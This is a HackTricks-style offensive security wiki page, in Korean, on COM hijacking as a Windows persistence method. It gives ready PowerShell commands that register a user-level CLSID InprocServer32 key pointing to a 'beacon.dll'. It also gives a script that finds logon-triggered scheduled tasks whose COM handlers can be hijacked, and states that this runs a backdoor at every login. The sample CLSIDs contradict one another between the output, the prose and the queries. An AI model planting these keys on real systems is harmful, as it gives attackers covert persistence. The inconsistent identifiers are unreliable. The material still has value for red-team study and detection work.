# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 존재하지 않는 COM 구성 요소 검색

HKCU의 값은 사용자가 수정할 수 있으므로 **COM Hijacking**은 **지속적인 메커니즘**으로 사용될 수 있습니다. `procmon`을 사용하면 공격자가 지속성을 위해 생성할 수 있는 존재하지 않는 COM 레지스트리를 쉽게 찾을 수 있습니다. 필터:

- **RegOpenKey** 작업.
- _결과_가 **NAME NOT FOUND**인 경우.
- _경로_가 **InprocServer32**로 끝나는 경우.

어떤 존재하지 않는 COM을 가장할지 결정한 후 다음 명령을 실행하십시오. _몇 초마다 로드되는 COM을 가장하기로 결정하면 과도할 수 있으니 주의하십시오._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks는 COM 객체를 호출하기 위해 Custom Triggers를 사용하며, Task Scheduler를 통해 실행되기 때문에 언제 트리거될지 예측하기가 더 쉽습니다.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

출력을 확인하면 **사용자가 로그인할 때마다** 실행될 작업을 선택할 수 있습니다.

이제 **HKEY\_**_**CLASSES\_**_**ROOT\CLSID**와 HKLM 및 HKCU에서 CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**를 검색하면, 일반적으로 HKCU에 값이 존재하지 않는 것을 발견할 수 있습니다.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
그럼, HKCU 항목을 생성하면 사용자가 로그인할 때마다 백도어가 실행됩니다.

{{#include ../../banners/hacktricks-training.md}}
